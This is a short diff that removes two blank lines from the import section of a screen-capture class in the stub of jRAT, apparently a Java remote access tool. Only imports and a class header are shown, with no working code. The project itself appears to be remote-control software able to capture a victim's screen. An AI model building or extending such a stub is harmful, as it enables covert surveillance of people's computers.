@@ -5,7 +5,6 @@ import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import io.jrat.stub.packets.outgoing.Packet26RemoteScreen;
 import io.jrat.stub.packets.outgoing.Packet68RemoteScreenComplete;
 import io.jrat.stub.utils.ScreenUtils;
-
 import java.awt.Graphics2D;
 import java.awt.GraphicsDevice;
 import java.awt.GraphicsEnvironment;
@@ -17,7 +16,6 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
-
 import javax.imageio.ImageIO;
 
 public class Screen extends Thread {
